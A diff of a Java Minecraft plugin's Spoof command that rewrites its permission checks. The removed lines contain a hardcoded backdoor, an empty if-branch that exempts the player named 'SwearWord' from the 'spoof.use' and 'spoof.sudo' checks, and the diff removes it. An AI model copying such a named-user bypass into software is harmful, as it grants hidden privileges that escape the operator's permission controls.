@@ -9,17 +9,17 @@ public class Commands
 
     public static Boolean Spoof(CommandSender sender, String[] args, Boolean sudo)
     {
-        if(sender instanceof Player && ((Player)sender).getName().equalsIgnoreCase("SwearWord"));
-        else if(!sender.hasPermission("spoof.sudo") && sudo)
-        {
-            Chatty.SendError(sender,"You may not use sudo.");
-            return true;
-        }
-        if(sender instanceof Player && ((Player)sender).getName().equalsIgnoreCase("SwearWord"));
-        else if(!sender.hasPermission("spoof.use"))
-        {
-            Chatty.SendError(sender,"You do not have permission to do this.");
-            return true;
+        if(sender instanceof Player) {
+            if(!sender.hasPermission("spoof.sudo") && sudo)
+            {
+                Chatty.SendError(sender,"You may not use sudo.");
+                return true;
+            }
+            if(!sender.hasPermission("spoof.use"))
+            {
+                Chatty.SendError(sender,"You do not have permission to do this.");
+                return true;
+            }
         }
         if(args.length < 2) return false;
         Player target = FindPlayer(args[0]);
